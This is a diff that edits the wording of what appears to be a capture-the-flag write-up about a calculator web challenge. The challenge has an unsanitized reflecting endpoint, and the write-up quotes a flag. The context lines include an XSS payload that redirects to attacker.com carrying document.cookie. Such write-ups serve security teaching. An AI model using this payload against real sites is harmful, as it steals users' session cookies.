@@ -115,7 +115,7 @@ flag: *ping{fastify-more-like-slowify-hehe-anMtYW5keQ==}*
 
 The challenge is a simple calculator website with, once again, the source code provided.
 
-The website is a simple calculator that allows us to do basic operations: add, subtract, multiply and divide.
+The calculator allows us to do basic operations: add, subtract, multiply and divide.
 
 Trying other things will display an error message:
 
@@ -139,7 +139,7 @@ fastify.get("/test", async (req, reply) => {
 });
 ```
 
-This endpoint will return the `html` query parameter as is, without any sanitization. We can use this to inject a script that will send the flag to us:
+This endpoint will return the `html` query parameter as it is, without any sanitization. We can use this to inject a script that will send the flag to us:
 
 ```js
 location = "http://attacker.com?" + document.cookie;
